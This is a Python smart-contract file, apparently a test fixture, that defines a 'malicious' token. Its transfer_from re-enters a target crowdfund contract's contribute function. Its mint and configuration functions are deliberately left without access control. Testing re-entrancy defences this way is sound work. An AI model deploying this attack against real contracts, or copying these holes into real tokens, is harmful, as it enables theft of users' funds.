# con_malicious_reentrant_token.py
I = importlib # Make sure importlib is available if used via I

balances = Hash(default_value=decimal('0.0'))
metadata = Hash()

# Re-entrancy specific state
re_entry_target_crowdfund_name = Variable()
re_entry_pool_id_for_crowdfund = Variable()
re_entry_contribution_amount = Variable()
re_entry_attempt_count = Variable()
re_entry_max_attempts = Variable() # To prevent infinite loops in complex scenarios

@construct
def seed():
    re_entry_attempt_count.set(0)
    re_entry_max_attempts.set(1) # Only re-enter once for this test

def internal_approve(spender: str, amount_to_approve: float):
    # print(f"MALICIOUS TOKEN (internal_approve): Owner '{ctx.this}' (this contract) is approving spender '{spender}' for {amount_to_approve}")
    balances[ctx.this, spender] = amount_to_approve # owner is ctx.this (this contract)

@export
def configure_re_entrancy(crowdfund_name: str, pool_id: str, amount: float):
    # In a real scenario, this would be access-controlled, e.g. by an owner variable
    # assert ctx.caller == self.owner.get(), "Only owner can configure"
    re_entry_target_crowdfund_name.set(crowdfund_name)
    re_entry_pool_id_for_crowdfund.set(pool_id)
    re_entry_contribution_amount.set(amount)
    # print(f"MALICIOUS TOKEN: Re-entrancy configured for {crowdfund_name}, pool {pool_id}, amount {amount}")

    # --- ADD SELF-APPROVAL LOGIC HERE ---
    # The contract (ctx.this) needs to approve the crowdfund_name to spend 'amount' of its own tokens.
    # To do this, ctx.caller inside 'approve' must be ctx.this (the malicious token contract).
    # This is achieved by calling 'approve' from within this function.
    if amount > 0 and crowdfund_name:
        # print(f"MALICIOUS TOKEN: Self-approving {crowdfund_name} for {amount} of its own tokens.")
        # When this `approve` is called, ctx.caller will be this contract itself (`ctx.this`)
        # because it's a direct internal call.
        internal_approve(spender=crowdfund_name, amount_to_approve=amount) # Call the contract's own approve method

@export
def mint(amount: float, to: str):
    # Simplified mint, assumes caller is authorized
    assert amount > 0, "Mint amount must be positive"
    current_bal = balances[to] if balances[to] is not None else decimal('0')
    balances[to] = current_bal + amount
    
    metadata['total_supply'] = metadata['total_supply'] if metadata['total_supply'] is not None else decimal('0.0')
    metadata['total_supply'] = metadata['total_supply'] + amount
    # print(f"MALICIOUS TOKEN: Minted {amount} to {to}. New balance: {balances[to]}")

@export
def transfer(amount: float, to: str):
    assert amount > 0, "Transfer amount must be positive"
    sender = ctx.caller
    sender_bal = balances[sender] if balances[sender] is not None else decimal('0')
    assert sender_bal >= amount, f"Insufficient balance for {sender}"

    balances[sender] = sender_bal - amount
    
    receiver_bal = balances[to] if balances[to] is not None else decimal('0')
    balances[to] = receiver_bal + amount
    return True

@export
def approve(amount: float, to: str):
    assert amount >= 0, "Approve amount must be non-negative"
    balances[ctx.caller, to] = amount
    # print(f"MALICIOUS TOKEN: {ctx.caller} approved {to} for {amount}")
    return True

@export
def transfer_from(amount: float, to: str, main_account: str):
    assert amount > 0, "Transfer amount must be positive"
    spender = ctx.caller # This is con_crowdfund_otc in the scenario

    owner_balance = balances[main_account] if balances[main_account] is not None else decimal('0')
    assert owner_balance >= amount, f"Insufficient balance for owner {main_account}"

    spender_allowance = balances[main_account, spender] if balances[main_account, spender] is not None else decimal('0')
    assert spender_allowance >= amount, f"Insufficient allowance for spender {spender} from owner {main_account}"

    # Perform the transfer
    balances[main_account] = owner_balance - amount
    balances[main_account, spender] = spender_allowance - amount
    
    receiver_bal = balances[to] if balances[to] is not None else decimal('0')
    balances[to] = receiver_bal + amount
    # print(f"MALICIOUS TOKEN: Transferred {amount} from {main_account} to {to} by {spender}")

    # --- RE-ENTRANCY LOGIC ---
    current_attempts = re_entry_attempt_count.get()
    max_attempts = re_entry_max_attempts.get()

    if current_attempts < max_attempts:
        target_crowdfund_name = re_entry_target_crowdfund_name.get()
        target_pool_id = re_entry_pool_id_for_crowdfund.get()
        re_contrib_amount = re_entry_contribution_amount.get()

        if target_crowdfund_name and target_pool_id and re_contrib_amount > 0:
            re_entry_attempt_count.set(current_attempts + 1)
            # print(f"MALICIOUS TOKEN: Attempting re-entry ({current_attempts + 1}/{max_attempts}) into {target_crowdfund_name}.contribute for pool {target_pool_id} with amount {re_contrib_amount}")
            
            crowdfund_contract = I.import_module(target_crowdfund_name)
            
            crowdfund_contract.contribute(pool_id=target_pool_id, amount=re_contrib_amount)
    
    return True


@export
def balance_of(address: str):
    bal = balances[address]
    return bal if bal is not None else decimal('0')
